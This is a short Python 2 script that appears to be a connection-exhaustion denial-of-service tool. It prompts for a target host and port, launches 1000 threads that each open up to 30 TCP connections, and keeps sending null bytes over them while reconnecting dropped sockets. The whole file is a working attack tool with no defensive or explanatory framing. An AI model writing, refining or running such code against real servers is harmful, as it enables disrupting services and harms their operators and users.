import socket,threading,time
u=raw_input("Target IP or URL(www.example.com):\n>")
p=input("Port:\n>")
global v
v=0
class xer(threading.Thread):
 def run (self):
  h=v
  l=[]
  for x in range(30):
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((u,p))
    print"[Connected to {}:{}]".format(u,p)
    l.append(s)
   except:
    pass
  while True:
   if len(l)==0:
    print"\nNo more connections can be made"
    break
   else:
    for z in range(20):
     try:
      s=l[z]
      s.send("\0")
      print"[Voly sent:{}]".format(h)
      time.sleep(.2)
     except:
      l.remove(s)
      try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect((u,p))
       print"[Connected to {}:{}]".format(u,p)
       l.append(s)
      except:
       pass
for x in range(1000):
  v=x
  t=xer()
  t.start()
  time.sleep(.01)
